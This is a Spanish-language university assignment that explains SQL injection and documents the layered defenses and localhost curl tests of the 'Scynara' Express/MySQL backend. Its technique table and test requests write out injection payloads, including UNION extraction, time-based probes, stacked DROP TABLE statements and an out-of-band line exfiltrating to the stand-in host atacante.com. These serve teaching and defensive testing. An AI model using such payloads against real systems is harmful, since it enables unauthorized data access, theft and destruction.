<div align="center">
  <img src="https://images.seeklogo.com/logo-png/7/2/ipn-logo-png_seeklogo-73340.png" align="left" width="90" alt="Logo IPN" />
  <img src="https://www.escom.ipn.mx/x/ee2021/images/galeriaEE2021/escudo_ESCOM.png" align="right" width="120" alt="Logo ESCOM" />
  
  <h2>Instituto Politécnico Nacional</h2>
  <h2>Escuela Superior de Cómputo</h2>

  <br><br><br><br>

  <b>Tarea</b><br>
  <b>Seguridad y Vulnerabilidades en Bases de Datos: SQL Injection</b>

  <br><br><br>

  <b>Alumno:</b><br><br>
  Olate Tomás Kevin Saúl<br>
  Garcia Peñalva Saúl 
  

  <br><br>

  <b>Profesor:</b><br>
  Gabriel Hurtado Avilés

  <br><br>

  <b>Unidad de Aprendizaje:</b><br>
  Bases de Datos

  <br><br>

  <b>Grupo:</b><br>
  3BV1

  <br><br>
</div>

---

# Tarea de SQL Injection

La presente tarea tiene como objetivo explorar los conceptos fundamentales de la inyección SQL (SQL Injection) y analizar su implementación en el proyecto Scynara. Para ello, se proporciona el backend de la aplicación, configurado para su despliegue en contenedores Docker, y se documenta el procedimiento de ejecución y validación mediante el uso de herramientas de prueba de APIs, como Postman y Thunder Client.

## Introducción 
En los años 90, cuando las páginas web comenzaron a ser interactivas y a conectarse directamente con las bases de datos, surgieron nuevos riesgos de seguridad. En ese contexto apareció la Inyección SQL, registrada por primera vez en 1998.

A pesar de todo lo que ha avanzado la tecnología y la programación desde entonces, esta amenaza no ha desaparecido. Hoy en día, prevenirla sigue siendo un requisito obligatorio y fundamental al desarrollar cualquier sistema que maneje información.

## ¿Qué es SQL Injection?
La Inyección SQL es un ataque que consiste en insertar código SQL malicioso directamente en los campos de entrada de datos de una aplicación, tales como formularios de inicio de sesión, barras de búsqueda o parámetros de la URL.  
Esta vulnerabilidad ocurre principalmente cuando un sistema no filtra, sanitiza ni valida adecuadamente la información ingresada por el usuario. Como resultado, cuando la aplicación procesa esta entrada, el motor de la base de datos recibe el código manipulado y lo ejecuta bajo la premisa de que es una instrucción legítima del sistema.  
En la práctica, este ataque se aprovecha de la mala costumbre de concatenar texto directamente en las consultas del backend. Al explotar esta falla, un atacante puede alterar la lógica original de la base de datos para evadir autenticaciones, extraer información confidencial o ejecutar comandos destructivos.

## Elementos Fundamentales de la Inyección SQL
Para que un ataque de inyección SQL se materialice, el sistema debe presentar deficiencias específicas en el procesamiento de la información. 
El ataque inicia cuando un actor malicioso inserta código manipulado en los campos de entrada de la aplicación, como los formularios de inicio de sesión o los parámetros de búsqueda. La vulnerabilidad crítica ocurre cuando el backend carece de una separación estricta entre la estructura de la consulta y los datos del usuario, tomando esta entrada y concatenándola directamente como texto plano sin un filtrado previo. En consecuencia, el motor de la base de datos recibe la cadena completa y ejecuta el código malicioso bajo la falsa premisa de que es una instrucción legítima del sistema.

Para que este engaño funcione en motores relacionales, los atacantes inyectan caracteres de control y palabras clave (como comillas simples ', signos de igual =, o guiones de comentario -- en el caso de MySQL) para alterar la estructura de la consulta original. El ejemplo más didáctico es la evasión de un login. Si el sistema espera credenciales, un atacante puede ingresar un texto manipulado como admin' -- en el campo de usuario. La comilla simple (') le indica a la base de datos que el texto del nombre ha terminado prematuramente, mientras que los guiones (--) le ordenan interpretar el resto de la consulta como un comentario, eliminando por completo la validación de la contraseña. Otra técnica fundamental es ingresar 1' OR '1'='1, lo cual fuerza a que la condición matemática sea siempre verdadera, otorgando acceso inmediato.

Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evoluciona en diferentes variantes dependiendo de cómo el sistema devuelva la información. A continuación, se clasifican las formas más comunes:

| **Categoría** | **Técnica** | **Descripción** | **Ejemplo** | **Escenario en el Backend** |
|---|---|---|---|---|
| **In-Band** | **Basada en Errores** | El atacante introduce instrucciones SQL malformadas con el propósito de provocar errores controlados en el motor de base de datos. Los mensajes de error generados pueden revelar información sensible, como nombres de tablas, columnas, rutas del sistema, versiones del SGBD o detalles de la configuración interna. | `' OR 1=CONVERT(int,(SELECT @@version)) --` | Durante la ejecución de un CRUD de productos, una excepción no controlada genera un código HTTP 500 y expone el *stack trace* completo, revelando el nombre de la base de datos, el tipo de gestor utilizado y parte de la consulta ejecutada. |
| **In-Band** | **Basada en UNION** | Aprovecha el operador `UNION SELECT` para combinar el resultado de una consulta maliciosa con el de una consulta legítima. Para que el ataque sea exitoso, ambas consultas deben poseer el mismo número de columnas y tipos de datos compatibles. | `' UNION SELECT 1, version(), current_database() --` | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios limitados intercepta la petición `GET /api/categorias?id=1` e inyecta una consulta `UNION` para obtener identificadores de inquilinos (`tenant_id`) y credenciales de otros administradores almacenadas en la base de datos. |
| **Inferencial** | **Basada en Booleanos** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
| **Inferencial** | **Basada en Tiempo** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
| **Consultas Apiladas** | **Ataques Destructivos / DDL-DML** | Consiste en finalizar la consulta original mediante un punto y coma (`;`) y concatenar instrucciones adicionales, como `DROP`, `UPDATE`, `INSERT` o `DELETE`. Su viabilidad depende de las restricciones impuestas por el controlador de conexión y la configuración del motor de base de datos. | `1'); DROP TABLE categorias_crud; --` | En determinadas configuraciones de PostgreSQL, un uso incorrecto del controlador de acceso puede permitir la ejecución de múltiples sentencias en una sola petición. En consecuencia, un atacante podría modificar o eliminar datos críticos mediante instrucciones concatenadas. |
| **Out-of-Band** | **Exfiltración Externa** | Se emplea cuando no es posible obtener información mediante respuestas directas o técnicas inferenciales. El atacante induce al motor de base de datos a realizar comunicaciones externas, como consultas DNS o solicitudes HTTP, enviando los datos extraídos hacia un servidor bajo su control. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(SQL Server)* | Tras ejecutar el payload, el servidor de base de datos realiza una resolución DNS hacia un dominio controlado por el atacante, por ejemplo `password_robada.atacante.com`. El atacante posteriormente analiza los registros de su servidor para recuperar la información exfiltrada. |

> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band** emplean canales externos de comunicación para la extracción de información.

**Mejores Prácticas de Mitigación**

La prevención de las vulnerabilidades de inyección SQL no depende de un único mecanismo de protección, sino de la implementación de una estrategia de **defensa en profundidad (*Defense in Depth*)**, en la que múltiples controles de seguridad operan de manera complementaria. Bajo este enfoque, si una capa de seguridad es comprometida, las restantes limitan el alcance del ataque y reducen significativamente su impacto.

Las siguientes prácticas constituyen las medidas fundamentales para prevenir y mitigar los ataques de SQL Injection en el desarrollo de *backends* modernos.

---

### Consultas Preparadas (*Parameterized Queries*)

Las consultas preparadas representan el mecanismo más eficaz y ampliamente recomendado para prevenir la inyección SQL. Su funcionamiento se basa en una separación estricta entre la lógica de la consulta y los datos proporcionados por el usuario.

En lugar de construir instrucciones SQL mediante concatenación de cadenas de texto, el motor de la base de datos compila primero la estructura de la consulta y, posteriormente, incorpora los valores recibidos en marcadores de posición (*placeholders*) previamente definidos. Como consecuencia, cualquier entrada enviada por el usuario es interpretada únicamente como un dato y nunca como una instrucción ejecutable.

De esta manera, intentos de inyección como `OR 1=1`, `UNION SELECT` o `DROP TABLE` son tratados como texto ordinario, impidiendo que modifiquen la consulta original.

**Ejemplos de implementación**

| **Entorno / Lenguaje** | **Implementación Vulnerable (Concatenación)** | **Implementación Segura (Parametrización)** |
|---|---|---|
| **Node.js + MySQL (`mysql2`)** | `const query = \`SELECT * FROM usuarios WHERE email = '${email_input}'\`;`<br>`connection.query(query, (err, res) => {...});` | `const query = 'SELECT * FROM usuarios WHERE email = ?';`<br>`connection.execute(query, [email_input], (err, res) => {...});` |
| **Python + PostgreSQL (`psycopg2`)** | `query = f"SELECT * FROM usuarios WHERE username = '{user_input}'"`<br>`cursor.execute(query)` | `query = "SELECT * FROM usuarios WHERE username = %s"`<br>`cursor.execute(query, (user_input,))` |

En las implementaciones seguras, el controlador de conexión (*driver*) recibe los parámetros por separado y realiza el tratamiento adecuado de los datos, evitando que sean interpretados como parte de la sentencia SQL.

---

### Principio de Menor Privilegio (*Least Privilege*)

Una arquitectura segura debe asumir que ninguna medida de protección es infalible. Por ello, las cuentas utilizadas por la aplicación para conectarse a la base de datos deben disponer exclusivamente de los permisos estrictamente necesarios para desempeñar sus funciones.

**Recomendaciones principales:**

- Utilizar credenciales específicas para cada módulo de la aplicación.
- Evitar el uso de cuentas administrativas globales, como `sa` o `postgres`.
- Conceder únicamente los permisos de lectura y escritura indispensables.
- Restringir la ejecución de instrucciones de definición de datos (DDL), tales como `DROP`, `ALTER`, `TRUNCATE` y `CREATE`.

La aplicación de este principio disminuye considerablemente el impacto potencial de un ataque exitoso, ya que limita las acciones que un atacante puede realizar sobre la base de datos.

---

### Validación y Sanitización Estricta de Entradas (*Whitelisting*)

La validación de datos constituye una capa adicional de protección que debe ejecutarse antes de que la información alcance la capa de acceso a datos (*Data Access Layer*). Su objetivo es garantizar que las entradas cumplan con el tipo, formato y restricciones previamente definidos por la aplicación.

**Validación de tipos de datos**

Si un *endpoint* espera un identificador numérico, el sistema debe verificar explícitamente que el valor recibido sea un entero válido.

**Solicitud esperada:**

```http
GET /api/categorias?id=1
```

**Intento de inyección:**

```http
GET /api/categorias?id=1 UNION SELECT password FROM usuarios
```

La petición debe rechazarse inmediatamente debido a que el parámetro recibido no cumple con el tipo de dato esperado.

**Uso de listas blancas (*Whitelisting*)**

Existen elementos de la consulta, como los nombres de columnas utilizados en `ORDER BY`, que no pueden parametrizarse directamente. En estos casos, la aplicación debe aceptar únicamente valores previamente autorizados.

```javascript
const columnasPermitidas = ['nombre', 'fecha', 'precio'];
```

**Solicitud válida:**

```http
GET /productos?sort=nombre
```

**Solicitud maliciosa:**

```http
GET /productos?sort=nombre; DROP TABLE productos
```

La segunda petición debe ser rechazada automáticamente, ya que el valor recibido no coincide con ninguno de los elementos definidos en la lista blanca.

---

### Manejo Seguro de Errores y Excepciones

Los mensajes de error producidos por la base de datos no deben exponerse directamente al cliente. La divulgación de excepciones, consultas SQL, nombres de tablas o versiones del gestor de base de datos proporciona información valiosa para un atacante durante las etapas de reconocimiento y explotación.

**Buenas prácticas recomendadas:**

- Registrar los errores detallados únicamente en archivos de *logs* internos.
- Devolver mensajes genéricos al usuario final.
- Evitar la exposición de *stack traces* y consultas SQL en las respuestas HTTP.

**Respuesta insegura:**

```text
ERROR: relation "usuarios" does not exist
```

**Respuesta recomendada:**

```text
Ha ocurrido un error al procesar la solicitud.
```

---

### Uso de ORM y Marcos de Acceso a Datos Seguros

Los marcos de persistencia de datos (*Object Relational Mapping - ORM*), como Hibernate, Sequelize, Entity Framework o SQLAlchemy, implementan mecanismos de parametrización de manera predeterminada.

Aunque su utilización no elimina completamente el riesgo de SQL Injection, sí reduce significativamente la probabilidad de introducir vulnerabilidades derivadas de la construcción manual de consultas mediante concatenación de cadenas.

Sin embargo, las consultas nativas (*Raw SQL Queries*) deben emplearse con precaución y respetando las mismas prácticas de parametrización, validación y control de permisos descritas anteriormente.

---

> **Idea clave:** La mitigación efectiva de SQL Injection requiere la combinación de múltiples controles de seguridad. Las consultas parametrizadas, el principio de menor privilegio, la validación estricta de entradas, el manejo seguro de errores y el uso adecuado de frameworks de acceso a datos constituyen un enfoque de defensa en profundidad que reduce drásticamente la superficie de ataque y fortalece la seguridad de las aplicaciones backend modernas.


# Análisis e Implementación en el Proyecto Scynara

## Arquitectura y Configuración del Entorno

El backend de Scynara está construido con **Node.js**, **Express** y **MySQL**. La implementación está organizada por capas, lo que permite separar la entrada HTTP, las reglas de negocio, la validación y el acceso a la base de datos.

| Capa | Ubicación en Scynara | Función |
|---|---|---|
| Rutas | `src/routes/` | Declaran endpoints, middlewares de autenticación, roles, rate limit y validación de parámetros. |
| Controladores | `src/controllers/` | Reciben `req`, construyen los datos necesarios y delegan la operación al servicio. |
| Servicios | `src/services/` | Validan datos con Zod, aplican reglas de negocio y lanzan errores controlados. |
| Modelos | `src/models/` | Ejecutan consultas MySQL mediante `mysql2/promise` y parámetros `?`. |
| Middlewares | `src/middlewares/` | Centralizan JWT, roles, rate limiting, validación de IDs y manejo de errores. |
| Configuración | `src/config/` | Carga variables de entorno y crea el pool de conexión MySQL. |
| Infraestructura | `Dockerfile`, `docker-compose.yml`, `docker/mysql/init/` | Ejecutan la API y MySQL en contenedores, con usuario de base de datos limitado. |

El flujo general de una petición protegida es el siguiente:

```text
Cliente HTTP
  -> ruta Express
  -> verifyToken / roles / rate limit / validateParamId
  -> controlador
  -> servicio con validación Zod
  -> modelo con consulta parametrizada
  -> MySQL
```

### Validaciones y Controles Aplicados en Scynara

| Recomendación | Dónde está implementada | Cómo funciona en este proyecto |
|---|---|---|
| Consultas preparadas | `src/models/*.model.js` | Las consultas usan `?` y arreglos de valores, por ejemplo `WHERE correo = ?` en `src/models/user.model.js`. |
| Validación de cuerpos | `src/schemas/*.schema.js` y `src/services/*.service.js` | Los servicios ejecutan `safeParse` o `parse` antes de llamar a los modelos. |
| Validación de IDs de URL | `src/middlewares/validateParamId.middleware.js` | Rechaza parámetros `:id` que no sean enteros positivos antes del controlador. |
| Autenticación JWT | `src/middlewares/auth.middleware.js` | Valida el token `Authorization: Bearer <TOKEN>` y asigna `req.user`. |
| Control de roles | `src/middlewares/role.middleware.js` | `requireAdmin` protege acciones administrativas y `preventGuestWrites` bloquea escrituras de invitados. |
| Rate limiting general | `src/app.js` y `src/middlewares/rateLimit.middleware.js` | `generalLimiter` limita solicitudes globales a la API. |
| Rate limiting de autenticación | `src/routes/auth.routes.js` | `authLimiter` se aplica en `POST /auth/login` y `POST /auth/register`. |
| Manejo seguro de errores | `src/middlewares/error.middleware.js` | En producción devuelve mensaje genérico y evita exponer stack traces al cliente. |
| Menor privilegio en MySQL | `docker/mysql/init/01-create-app-user.sh` | Crea un usuario con `SELECT`, `INSERT`, `UPDATE`, `DELETE`; no otorga `DROP`, `ALTER` ni `CREATE`. |
| Aislamiento de infraestructura | `docker-compose.yml` | MySQL no publica puertos hacia el host; la API se comunica por la red interna de Docker. |

### Evidencias Directas en el Código

**1. Login protegido con validación y consulta parametrizada**

Ruta:

```javascript
router.post('/login', authLimiter, login);
```

Archivo: `src/routes/auth.routes.js`

Validación del cuerpo:

```javascript
const validation = loginSchema.safeParse(data);
```

Archivo: `src/services/auth.service.js`

Consulta segura:

```javascript
const [rows] = await pool.query(
  `SELECT * FROM Usuarios WHERE correo = ? LIMIT 1`,
  [email]
);
```

Archivo: `src/models/user.model.js`

El correo recibido no se concatena en el SQL. Si se envía un payload como `' OR '1'='1`, se procesa como dato y no como instrucción.

**2. Validación de identificadores en rutas**

Middleware:

```javascript
export const validateParamId = (paramName = 'id') => (req, res, next) => {
  const rawValue = req.params[paramName];
  const numericValue = Number(rawValue);

  if (!Number.isInteger(numericValue) || numericValue <= 0) {
    return res.status(400).json({
      message: `El parámetro ${paramName} debe ser un entero positivo.`
    });
  }

  req.params[paramName] = numericValue;
  next();
};
```

Archivo: `src/middlewares/validateParamId.middleware.js`

Se aplica en rutas como:

```javascript
router.get('/:id', validateParamId(), getById);
router.put('/:id', validateParamId(), update);
router.delete('/:id', validateParamId(), remove);
```

Archivos:

- `src/routes/product.routes.js`
- `src/routes/customers.routes.js`
- `src/routes/proveedor.routes.js`
- `src/routes/ventas.routes.js`
- `src/routes/auth.routes.js`

Con esto, una URL como `/products/1 OR 1=1` se rechaza antes de llegar al modelo.

**3. Validación de productos con Zod**

```javascript
export const createProductSchema = z.object({
  id_tienda: z.number().int().positive('El ID de la tienda es inválido'),
  id_proveedor: z.number().int().positive().nullable().optional(),
  id_categoria: z.number().int().positive().nullable().optional(),
  nombre: z.string().min(2).max(100).trim(),
  cantidad: z.number().int().min(0).default(0),
  precio_caja: z.number().min(0),
  precio_unitario: z.number().min(0),
  fecha_caducidad: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).nullable().optional()
});
```

Archivo: `src/schemas/product.schema.js`

Uso del esquema:

```javascript
const validation = createProductSchema.safeParse(data);
```

Archivo: `src/services/product.service.js`

Los campos numéricos no aceptan cadenas como `"1 OR 1=1"` o `"10; DROP TABLE Productos;"`.

**4. Consultas parametrizadas en módulos CRUD**

Productos:

```javascript
WHERE p.id_producto = ? AND p.id_tienda = ?
```

Archivo: `src/models/product.model.js`

Clientes:

```javascript
SELECT * FROM Clientes
WHERE id_cliente = ? AND id_tienda = ?
```

Archivo: `src/models/customers.model.js`

Proveedores:

```javascript
WHERE p.id_proveedor = ? AND p.id_tienda = ?
```

Archivo: `src/models/proveedor.model.js`

Ventas:

```javascript
SELECT v.*, c.nombre AS cliente_nombre, u.nombre AS vendedor_nombre
WHERE v.id_venta = ? AND v.id_tienda = ?
```

Archivo: `src/models/venta.model.js`

En todos estos casos, los valores llegan separados del texto SQL, reduciendo el riesgo de inyección.

**5. Menor privilegio en MySQL**

El usuario de aplicación se crea con permisos limitados:

```sql
GRANT SELECT, INSERT, UPDATE, DELETE ON ${DB_NAME}.* TO '${DB_USER}'@'%';
```

Archivo: `docker/mysql/init/01-create-app-user.sh`

Esto impide que la aplicación ejecute operaciones DDL como `DROP TABLE`, `ALTER TABLE` o `CREATE TABLE` con el usuario normal de conexión.

**6. Manejo seguro de errores**

```javascript
const response = {
  message: isDev ? err.message : 'Error interno del servidor',
};
```

Archivo: `src/middlewares/error.middleware.js`

En producción, el cliente no recibe stack traces, consultas SQL ni detalles internos de MySQL.

### Ejecución con Docker

El proyecto se ejecuta con dos servicios:

- `api`: backend Express expuesto en `http://localhost:3000`.
- `mysql`: base de datos MySQL 8.4 en la red interna de Docker.

Comandos:

```bash
cp .env.example .env
docker compose up --build
```

Si se agrega un script `.sql` de creación de tablas o datos iniciales, debe colocarse en:

```text
docker/mysql/init/
```

MySQL ejecuta esos archivos al crear por primera vez el volumen `mysql_data`.

Para reiniciar desde cero:

```bash
docker compose down -v
docker compose up --build
```

> `docker compose down -v` elimina los datos actuales de MySQL.

## Herramientas de Validación y Pruebas

Las siguientes pruebas están pensadas para ejecutarse en entorno local con Docker. También pueden replicarse en Postman o Thunder Client usando el mismo método, URL, encabezados y cuerpo.

Primero define la URL base:

```bash
BASE_URL=http://localhost:3000
```

### Petición 1: verificar que la API responde

```bash
curl -i "$BASE_URL/"
```

Resultado esperado:

```http
HTTP/1.1 200 OK
```

```json
{
  "status": "API funcionando 🚀"
}
```

### Petición 2: intento de SQL Injection en login

```bash
curl -i -X POST "$BASE_URL/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR '1'='1' --\",\"password\":\"cualquier-cosa\"}"
```

Resultado esperado:

- Código `400` por validación de correo o `401` por credenciales inválidas.
- No debe regresar `token`.
- No debe iniciar sesión.

Control que se valida:

- `loginSchema` en `src/schemas/user.schema.js`.
- `safeParse` en `src/services/auth.service.js`.
- Consulta `WHERE correo = ?` en `src/models/user.model.js`.

### Petición 3: correo con payload dentro de un valor

```bash
curl -i -X POST "$BASE_URL/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@scynara.com' OR '1'='1\",\"password\":\"cualquier-cosa\"}"
```

Resultado esperado:

- Código `400` o `401`.
- No debe regresar usuarios adicionales.
- No debe generarse JWT.

Control que se valida:

- Parametrización en `findUserByEmail`.
- El payload se trata como texto, no como SQL.

### Petición 4: rate limit de autenticación

Ejecuta varias veces la misma petición de login inválido:

```bash
for i in 1 2 3 4 5 6; do
  curl -i -X POST "$BASE_URL/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"noexiste@scynara.com","password":"incorrecta"}'
done
```

Resultado esperado:

- Las primeras solicitudes fallan por credenciales.
- Al superar el límite, la API debe responder con bloqueo temporal.

Control que se valida:

- `authLimiter` en `src/routes/auth.routes.js`.
- Configuración en `src/middlewares/rateLimit.middleware.js`.

### Petición 5: ruta protegida sin JWT

```bash
curl -i "$BASE_URL/products"
```

Resultado esperado:

```http
HTTP/1.1 401 Unauthorized
```

Control que se valida:

- `verifyToken` en `src/middlewares/auth.middleware.js`.
- Protección aplicada en `src/app.js` y `src/routes/product.routes.js`.

### Petición 6: ruta protegida con ID malicioso

Esta prueba requiere un token válido.

```bash
TOKEN=pega_aqui_un_jwt_valido

curl -i "$BASE_URL/products/1%20OR%201=1" \
  -H "Authorization: Bearer $TOKEN"
```

Resultado esperado:

```http
HTTP/1.1 400 Bad Request
```

Respuesta esperada:

```json
{
  "message": "El parámetro id debe ser un entero positivo."
}
```

Control que se valida:

- `validateParamId` en `src/middlewares/validateParamId.middleware.js`.
- Aplicación en `src/routes/product.routes.js`.

### Petición 7: ID negativo o inválido

```bash
curl -i "$BASE_URL/clientes/-5" \
  -H "Authorization: Bearer $TOKEN"
```

Resultado esperado:

- Código `400`.
- La solicitud no debe llegar al modelo de clientes.

Control que se valida:

- `validateParamId` en `src/routes/customers.routes.js`.

### Petición 8: intento destructivo en nombre de producto

```bash
curl -i -X POST "$BASE_URL/products" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"nombre\":\"Producto prueba'); DROP TABLE Productos; --\",\"cantidad\":10,\"precio_caja\":100,\"precio_unitario\":10}"
```

Resultado esperado:

- La tabla `Productos` no debe eliminarse.
- Si el token pertenece a un usuario con `id_tienda`, el valor se procesa como texto o se rechaza por validación de negocio.
- No debe ejecutarse `DROP TABLE`.

Controles que se validan:

- `createProductSchema` en `src/schemas/product.schema.js`.
- `safeParse` en `src/services/product.service.js`.
- `INSERT INTO Productos (...) VALUES (?, ?, ?, ?, ?, ?, ?, ?)` en `src/models/product.model.js`.
- Privilegios limitados del usuario MySQL en `docker/mysql/init/01-create-app-user.sh`.

### Petición 9: inyección en campos numéricos

```bash
curl -i -X POST "$BASE_URL/products" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"id_proveedor\":\"1 OR 1=1\",\"id_categoria\":\"1; DROP TABLE Categoria;\",\"nombre\":\"Caja de prueba\",\"cantidad\":\"10; DROP TABLE Productos;\",\"precio_caja\":100,\"precio_unitario\":10}"
```

Resultado esperado:

- Código `400`.
- Los campos numéricos no deben aceptar cadenas.
- No debe ejecutarse ninguna consulta de inserción.

Control que se valida:

- Tipado estricto de Zod en `src/schemas/product.schema.js`.

### Petición 10: usuario invitado intentando escribir

Esta prueba requiere un JWT de un usuario con rol `INVITADO`.

```bash
GUEST_TOKEN=pega_aqui_un_jwt_de_invitado

curl -i -X DELETE "$BASE_URL/products/1" \
  -H "Authorization: Bearer $GUEST_TOKEN"
```

Resultado esperado:

```http
HTTP/1.1 403 Forbidden
```

Control que se valida:

- `preventGuestWrites` en `src/middlewares/role.middleware.js`.
- Aplicación global en `src/app.js` para `/products`, `/clientes`, `/ventas` y `/proveedores`.

### Petición 11: verificar permisos del usuario MySQL

Desde el contenedor de MySQL:

```bash
docker compose exec mysql mysql -u"$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" \
  -e "DROP TABLE Productos;"
```

Resultado esperado:

- MySQL debe rechazar la operación por falta de permisos.
- El usuario de aplicación no debe poder ejecutar `DROP TABLE`.

Control que se valida:

- `GRANT SELECT, INSERT, UPDATE, DELETE` en `docker/mysql/init/01-create-app-user.sh`.

### Petición 12: revisar logs sin exponer detalles al cliente

```bash
docker compose logs -f api
```

Resultado esperado:

- Los detalles técnicos se observan en logs internos.
- La respuesta HTTP en producción no debe exponer stack traces ni consultas SQL.

Control que se valida:

- `errorHandler` en `src/middlewares/error.middleware.js`.

### Evidencias Recomendadas

Para documentar que las protecciones funcionan, se recomienda guardar:

- Captura de cada petición en Postman, Thunder Client o terminal.
- Código HTTP recibido.
- Respuesta JSON.
- Logs de `docker compose logs -f api`.
- Captura de MySQL demostrando que las tablas no fueron eliminadas.
- Captura del rechazo de `DROP TABLE` con el usuario limitado.

### Conclusión de la Validación

Scynara implementa las recomendaciones principales contra SQL Injection mediante una defensa por capas: validación de entradas con Zod, validación centralizada de parámetros de ruta, consultas parametrizadas con `mysql2`, autenticación JWT, control de roles, rate limiting, manejo seguro de errores y un usuario MySQL con privilegios mínimos. Estas medidas no dependen de un único control; si una entrada maliciosa supera una capa, todavía debe atravesar validación de tipos, parametrización SQL y permisos restringidos en la base de datos.
